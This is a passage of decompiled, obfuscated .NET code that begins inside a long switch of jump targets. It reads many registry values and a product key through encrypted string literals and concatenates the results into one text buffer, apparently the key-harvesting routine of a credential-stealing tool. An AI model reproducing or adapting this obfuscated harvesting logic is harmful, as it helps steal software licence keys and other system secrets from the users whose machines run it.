								goto IL_4c57;
							case 416:
							case 417:
								goto IL_4cb1;
							case 418:
								goto IL_4ce4;
							case 419:
							case 420:
								goto IL_4d3e;
							case 421:
								goto IL_4d71;
							case 422:
							case 423:
								goto IL_4dcb;
							case 424:
								goto IL_4dfe;
							case 425:
							case 426:
								goto IL_4e58;
							case 427:
								goto IL_4e8b;
							case 428:
							case 429:
								goto IL_4ee5;
							case 430:
								goto IL_4f18;
							case 431:
							case 432:
								goto IL_4f72;
							case 433:
								goto IL_4fa5;
							case 434:
							case 435:
								goto IL_4fff;
							case 436:
								goto IL_5032;
							case 437:
							case 438:
								goto IL_508c;
							case 439:
								goto IL_50bf;
							case 440:
							case 441:
								goto IL_5119;
							case 442:
								goto IL_514c;
							case 443:
							case 444:
								goto IL_51a6;
							case 445:
								goto IL_51d9;
							case 446:
							case 447:
								goto IL_5233;
							case 448:
								goto IL_5266;
							case 449:
							case 450:
								goto IL_52c0;
							case 451:
								goto IL_52f3;
							case 452:
							case 453:
								goto IL_534d;
							case 454:
								goto IL_5380;
							case 455:
							case 456:
								goto IL_53da;
							case 457:
								goto IL_540d;
							case 458:
							case 459:
								goto IL_5467;
							case 460:
								goto IL_549a;
							case 461:
							case 462:
								goto IL_54f4;
							case 463:
								goto IL_5527;
							case 464:
							case 465:
								goto IL_5581;
							case 466:
								goto IL_55b4;
							case 467:
							case 468:
								goto IL_560e;
							case 469:
								goto IL_5641;
							case 470:
							case 471:
								goto IL_569b;
							case 472:
								goto IL_56ce;
							case 473:
							case 474:
								goto IL_5728;
							case 475:
								goto IL_575b;
							case 476:
							case 477:
								goto IL_57b5;
							case 478:
								goto IL_57e8;
							case 479:
							case 480:
								goto IL_5842;
							case 481:
								goto IL_5875;
							case 482:
							case 483:
								goto IL_58cf;
							case 484:
								goto IL_5902;
							case 485:
							case 486:
								goto IL_595c;
							case 487:
								goto IL_598f;
							case 488:
							case 489:
								goto IL_59e9;
							case 490:
								goto IL_5a1c;
							case 491:
							case 492:
								goto IL_5a76;
							case 493:
								goto IL_5aa9;
							case 494:
							case 495:
								goto IL_5b03;
							case 496:
								goto IL_5b36;
							case 497:
							case 498:
								goto IL_5b90;
							case 499:
								goto IL_5bc3;
							case 500:
							case 501:
								goto IL_5c1d;
							case 502:
								goto IL_5c50;
							case 503:
							case 504:
								goto IL_5caa;
							case 505:
								goto IL_5cdd;
							case 506:
							case 507:
								goto IL_5d37;
							case 508:
								goto IL_5d6a;
							case 509:
							case 510:
								goto IL_5dc4;
							case 511:
								goto IL_5df7;
							case 512:
							case 513:
								goto IL_5e51;
							case 514:
								goto IL_5e84;
							case 515:
							case 516:
								goto IL_5ede;
							case 517:
								goto IL_5f11;
							case 518:
							case 519:
								goto IL_5f6b;
							case 520:
								goto IL_5f9e;
							case 521:
							case 522:
								goto IL_5ff8;
							case 523:
								goto IL_602b;
							case 524:
							case 525:
								goto IL_6085;
							case 526:
								goto IL_60b8;
							case 527:
							case 528:
								goto IL_6112;
							case 529:
								goto IL_6145;
							case 530:
							case 531:
								goto IL_619f;
							case 532:
								goto IL_61d2;
							case 533:
							case 534:
								goto IL_622c;
							case 535:
								goto IL_625f;
							case 536:
							case 537:
								goto IL_62b9;
							case 538:
								goto IL_62ec;
							case 539:
							case 540:
								goto IL_6346;
							case 541:
								goto IL_6379;
							case 542:
							case 543:
								goto IL_63d3;
							case 544:
								goto IL_6406;
							case 545:
							case 546:
								goto IL_6460;
							case 547:
								goto IL_6493;
							case 548:
							case 549:
								goto IL_64ed;
							case 550:
								goto IL_6520;
							case 551:
							case 552:
								goto IL_657a;
							case 553:
								goto IL_65ad;
							case 554:
							case 555:
								goto IL_6607;
							case 556:
								goto IL_663a;
							case 557:
							case 558:
								goto IL_6694;
							case 559:
								goto IL_66c7;
							case 560:
							case 561:
								goto IL_6721;
							case 562:
								goto IL_6754;
							case 563:
							case 564:
								goto IL_67ae;
							case 565:
								goto IL_67e1;
							case 566:
							case 567:
								goto IL_683b;
							case 568:
								goto IL_686e;
							case 569:
							case 570:
								goto IL_68c8;
							case 571:
								goto IL_68fb;
							case 572:
							case 573:
								goto IL_6955;
							case 574:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 575:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_6955:
						num = 573;
						text = text + GClass0.smethod_0("hŮȄ\u0307ѴՃ\u0657ݍࡂ\u094e\u0a4a\u0b45౦ഥว༧၌ᅳቷ፼ᑸᕡᙦ\u1734ᡃᥠ\u1a7e᭴ᱺᵥṹ\u1f7f\u2068Ⅲ≥⏴⑴╵♠❨⠸⤸⨺") + GetProductKey() + GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f");
						break;
						IL_68fb:
						num = 571;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EŸɾ\u036eѣսجܣ\u0859६\u0a7a୮౧൩อ༸\u1038ᄺ")), Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4c᱁ᵻṡὠ⁸Ⅵ≯⍼\u245b║♬❪⡢⥯⩱"), GClass0.smethod_0("tŠɣ\u0368ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6955;
						IL_0005:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000d;
						IL_000d:
						num = 3;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞ\u2d76\u2e7c⽻っㅤ㉺㍺㑺㕱㘱㝑㡽㥺㩾㭐㱈㵸㹰㽻䁮䅵䉙䍡䑱䕥䙢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_004f;
						}
						goto IL_00b8;
						IL_004f:
						num = 4;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("RŢɶͽѤտث\u0745\u087b९੮୨\u0c64൨\u0e38༸\u103a")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞ\u2d76\u2e7c⽻っㅤ㉺㍺㑺㕱㘱㝑㡽㥺㩾㭐㱈㵸㹰㽻䁮䅵䉙䍡䑱䕥䙢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_00b8;
						IL_00b8:
						num = 6;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u0003āȌ\u0311Иԅ\u0610ܖࠑइਏଔౠ൫\u0e6e\u0f79\u1069ᅦቪፗᑑᕂᙂ\u1755ᡁᥗ\u1a6d᭵᱃ᵋṎ\u1f58⁙ⅅ≇⍁⑄┆♤❖⡗⥑⩽⭥ⱳ\u2d7b\u2e7e⽨どㅵ㉷㍱㑴㔶㙔㝦㡧㥡㩍㭓㱽㵷㹾㽥䁸䄪䉞䍩䑵䕵䙙䝡䡱䥥䩢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_00fa;
						}
						goto IL_0163;
						IL_00fa:
						num = 7;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Mſɵ\u0378ѣպبݐࡧॷ\u0a77ସసഺ")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u0003āȌ\u0311Иԅ\u0610ܖࠑइਏଔౠ൫\u0e6e\u0f79\u1069ᅦቪፗᑑᕂᙂ\u1755ᡁᥗ\u1a6d᭵᱃ᵋṎ\u1f58⁙ⅅ≇⍁⑄┆♤❖⡗⥑⩽⭥ⱳ\u2d7b\u2e7e⽨どㅵ㉷㍱㑴㔶㙔㝦㡧㥡㩍㭓㱽㵷㹾㽥䁸䄪䉞䍩䑵䕵䙙䝡䡱䥥䩢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0163;
						IL_0163:
						num = 9;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑹᕳᙠᝤᡳᥣ\u1a75\u1b73ᱫᵁṉὈ⁞⅛≇⍉\u244f╆☄❢⡐⥕⩓⭃ⱛⵜ⸼⽜せㅔ㉝㍄㑊㕗㙵㝧㡦㥽㩵㭩㱧㵨㹠㽯䀪䄻䈹䌳䐴䕙䙡䝱䡥䥢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_01a6;
						}
						goto IL_0210;
						IL_01a6:
						num = 10;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Qųɥ\u0364ѣի٫ݥ\u086e०੭ନవഷ\u0e31༶\u1038ᄸሺ")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑹᕳᙠᝤᡳᥣ\u1a75\u1b73ᱫᵁṉὈ⁞⅛≇⍉\u244f╆☄❢⡐⥕⩓⭃ⱛⵜ⸼⽜せㅔ㉝㍄㑊㕗㙵㝧㡦㥽㩵㭩㱧㵨㹠㽯䀪䄻䈹䌳䐴䕙䙡䝱䡥䥢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0210;
						IL_0210:
						num = 12;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞⵛ⸹⽟ざㅛ㉐㍇㑏㕐㙰㝤㡻㥢㩨㭪㱢㵯㹥㽬䀧䄴䉙䍡䑱䕥䙢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0253;
						}
						goto IL_02bd;
						IL_0253:
						num = 13;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Můɹ\u0378ѧկٯݡࡢ४ਥଶసസ\u0e3a")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞⵛ⸹⽟ざㅛ㉐㍇㑏㕐㙰㝤㡻㥢㩨㭪㱢㵯㹥㽬䀧䄴䉙䍡䑱䕥䙢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_02bd;
						IL_02bd:
						num = 15;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u001eĞȑ\u030aЍԝ؟܌ࠏ\u0901ਓଆఋഊ\u0e00༎ဈᄀመጐᐍᔇᘔᝨ\u187f\u196f\u1a79᭧᱿ᵕṝὔ⁂ⅇ≛⍝\u245b╒☐❮⡜⥙⩟⭷Ɐ\u2d68⸈⽠でㅨ㉡㍰㑾㕣㙁㝫㡪㥱㩹㭽㱳㵼㹴㽳䀶䄧䈴䍀䑢䕴䙳䝦䡯䥡䨬䭍䱥䵻乫佢偵兙剡危呥啢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0300;
						}
						goto IL_036a;
						IL_0300:
						num = 16;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("]ſɩ\u0368ѷտٿݱ\u0872ॺ\u0a71\u0b34డലโའ\u106aᅭቤ፭ᑧᔪᙏᝧᡵᥥ\u1a60᭷\u1c38ᴸḺ")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u001eĞȑ\u030aЍԝ؟܌ࠏ\u0901ਓଆఋഊ\u0e00༎ဈᄀመጐᐍᔇᘔᝨ\u187f\u196f\u1a79᭧᱿ᵕṝὔ⁂ⅇ≛⍝\u245b╒☐❮⡜⥙⩟⭷Ɐ\u2d68⸈⽠でㅨ㉡㍰㑾㕣㙁㝫㡪㥱㩹㭽㱳㵼㹴㽳䀶䄧䈴䍀䑢䕴䙳䝦䡯䥡䨬䭍䱥䵻乫佢偵兙剡危呥啢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_036a;
						IL_036a:
						num = 18;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑑᕛᙈᝌᡛ᥋\u1a5dᭋ᱕ᵇṍ\u1f47⁗⅚≌⍉\u244f╟♏❙⡓⤻⩔⭒ⱄⵌ⸪⽀きㅌ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_03ad;
						}
						goto IL_0417;
						IL_03ad:
						num = 19;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("LŨɺ\u0364Ѵռض\u0738࠸\u093a")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑑᕛᙈᝌᡛ᥋\u1a5dᭋ᱕ᵇṍ\u1f47⁗⅚≌⍉\u244f╟♏❙⡓⤻⩔⭒ⱄⵌ⸪⽀きㅌ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0417;
						IL_0417:
						num = 21;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱘ᵻṣ\u1f7f\u2063ⅽ≠⍻⑾╾♓❍⡬⥠⩧⬪ⱦ\u2d6e⸧⽂ばㅰ㉺㌢㐵"), GClass0.smethod_0("eŪɠ\u0368ѧո"), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_045a;
						}
						goto IL_04c4;
						IL_045a:
						num = 22;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Rűɣ\u0362Эգ٭ܪࡍॽੳ\u0b7fథര\u0e38༸\u103a")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱘ᵻṣ\u1f7f\u2063ⅽ≠⍻⑾╾♓❍⡬⥠⩧⬪ⱦ\u2d6e⸧⽂ばㅰ㉺㌢㐵"), GClass0.smethod_0("eŪɠ\u0368ѧո"), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_04c4;
						IL_04c4:
						num = 24;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u001eĞȑ\u030aЍԝ؟܌ࠏ\u0901ਓଆఋഊ\u0e00༎ဈᄀመጐᐍᔇᘔᝨ\u187f\u196f\u1a79᭧᱿ᵕṝὔ⁂ⅇ≛⍝\u245b╒☐❮⡜⥙⩟⭷Ɐ\u2d68⸈⽠でㅨ㉡㍰㑾㕯㙅㝺㡺㤽㩚㭴㱨㴹㹋㽧䁳䅰䉰䌳䑚䕾䙤䜯䡞䥸䩾䭸䱿䵠乼伧倴兙剡危呥啢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0507;
						}
						goto IL_0571;
						IL_0507:
						num = 25;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("QŻɸ\u0378л՜ٶݪ࠷\u0945\u0a65ୱ\u0c76൶\u0e31མ\u1060ᅺር\u135cᑾᕸᙺ\u177dᡮᥲᨥ\u1b36\u1c38ᴸḺ")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u001eĞȑ\u030aЍԝ؟܌ࠏ\u0901ਓଆఋഊ\u0e00༎ဈᄀመጐᐍᔇᘔᝨ\u187f\u196f\u1a79᭧᱿ᵕṝὔ⁂ⅇ≛⍝\u245b╒☐❮⡜⥙⩟⭷Ɐ\u2d68⸈⽠でㅨ㉡㍰㑾㕯㙅㝺㡺㤽㩚㭴㱨㴹㹋㽧䁳䅰䉰䌳䑚䕾䙤䜯䡞䥸䩾䭸䱿䵠乼伧倴兙剡危呥啢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0571;
						IL_0571:
						num = 27;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u0011ēȒ\u030fЊԘ\u061c\u0711ࠐजਐ\u0b03ఌഏฃ༃ဇᄍማጕᐊᔂᘗ\u1715᠀ᤒ\u1a7a᭢ᱸᵐṞὙ⁍⅊≘⍘\u245c╗☓❳⡃⥄⩜⭲ⱨⵀ⹎⽉そㅚ㉈㍈㑌㕇㘃㝣㡓㥔㩬㭂㱓㵹㹾㽾䀹䅾䉸䍤䐵䕇䙣䝷䡴䥴䨯䭞䱿䵣乘佾偻六剢卲呙啡噱坥塢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_05b4;
						}
						goto IL_061e;
						IL_05b4:
						num = 28;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("RžɿͽиՑٹݧ࠴\u0940\u0a62୴\u0c75൫ฮཝၾᅤሪፚᑼᕵᙣᝠᡰ\u1938ᨸ\u1b3a")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\u0011ēȒ\u030fЊԘ\u061c\u0711ࠐजਐ\u0b03ఌഏฃ༃ဇᄍማጕᐊᔂᘗ\u1715᠀ᤒ\u1a7a᭢ᱸᵐṞὙ⁍⅊≘⍘\u245c╗☓❳⡃⥄⩜⭲ⱨⵀ⹎⽉そㅚ㉈㍈㑌㕇㘃㝣㡓㥔㩬㭂㱓㵹㹾㽾䀹䅾䉸䍤䐵䕇䙣䝷䡴䥴䨯䭞䱿䵣乘佾偻六剢卲呙啡噱坥塢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_061e;
						IL_061e:
						num = 30;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱣᵉṁὀ⁖⅓≏⍱⑷╾☼❚⡨⥭⩫⭋ⱓⵔ⸴⽀ぢㅾ㉢㍻㑽㕑㙊㝂㡌㥈㨨㬷㰿㵙㹡㽱䁥䅢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0661;
						}
						goto IL_06cb;
						IL_0661:
						num = 31;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("LŠɮ\u0366ЦԵؽ\u0738࠸\u093a")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱣᵉṁὀ⁖⅓≏⍱⑷╾☼❚⡨⥭⩫⭋ⱓⵔ⸴⽀ぢㅾ㉢㍻㑽㕑㙊㝂㡌㥈㨨㬷㰿㵙㹡㽱䁥䅢"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_06cb;
						IL_06cb:
						num = 33;
						if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱦᵂṊ\u1f46⁆ⅾ≱⍈⑰╪♲❯⡳⥵⩩⭄Ⱞⴸ⸥⽈ぁㅷ㉶㍹㑼㕺㙿㝭㡿㥣㩦㭦㱛㵕㹠㽶䁪䅣䉭"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ")), (object)GClass0.smethod_0(""), false))
						{
							goto IL_070e;
						}
						goto IL_0778;
						IL_070e:
						num = 34;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("WűɻͱѷԱـݧࡡॹ\u0a63\u0b78\u0c62൦\u0e78༧ဿᄫሴጸᐸᔺ")), ((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱦᵂṊ\u1f46⁆ⅾ≱⍈⑰╪♲❯⡳⥵⩩⭄Ⱞⴸ⸥⽈ぁㅷ㉶㍹㑼㕺㙿㝭㡿㥣㩦㭦㱛㵕㹠㽶䁪䅣䉭"), GClass0.smethod_0(""), (object)GClass0.smethod_0("`Ŷɱ\u036dѳ"))), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0778;
						IL_0778:
						num = 36;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱳᵇṍὐ⁍ⅇ≔⍃\u244d╭♰❲⡴⥭⩽⭥ⰶⵖ\u2e71⽿まㄱ㉀㍮㑠㕩㙣㝹㡫㤩㩜㭨㱫㵪㹶㽱䁭䅶"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_07a8;
						}
						goto IL_07ff;
						IL_07a8:
						num = 37;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("rŐɳͷѳըپݨ࠹ज़ੲ\u0b7a౹ഴใ\u0f73ၿᅴበ፼ᑬᔬᙟᝥᡤᥧ\u1a75᭴ᱪᵳḸἸ›")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱳᵇṍὐ⁍ⅇ≔⍃\u244d╭♰❲⡴⥭⩽⭥ⰶⵖ\u2e71⽿まㄱ㉀㍮㑠㕩㙣㝹㡫㤩㩜㭨㱫㵪㹶㽱䁭䅶"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_07ff;
						IL_07ff:
						num = 39;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱲᵄṌὗ⁌⅄≕⍼\u244c╮♱❵⡵⥮⩼⭪ⰷⵕ\u2e70⽸みㄲ㉒㍸㑮㕡㙾㜬㡟㥢㩬㭧㱵㵿㹙㽏䁦䅻䉲"), GClass0.smethod_0("HŢɹ\u036aуբٿݚࡗ\u0940\u0a41\u0b55"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_082f;
						}
						goto IL_0886;
						IL_082f:
						num = 40;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("NŬɷͳѷլٲݤ࠵\u0957੶\u0b7e౽ര\u0e4cས\u106cᅣቸጪᑝᕠᙢᝩᡷ\u197dᨸ\u1b38\u1c3a")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱲᵄṌὗ⁌⅄≕⍼\u244c╮♱❵⡵⥮⩼⭪ⰷⵕ\u2e70⽸みㄲ㉒㍸㑮㕡㙾㜬㡟㥢㩬㭧㱵㵿㹙㽏䁦䅻䉲"), GClass0.smethod_0("HŢɹ\u036aуբٿݚࡗ\u0940\u0a41\u0b55"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0886;
						IL_0886:
						num = 42;
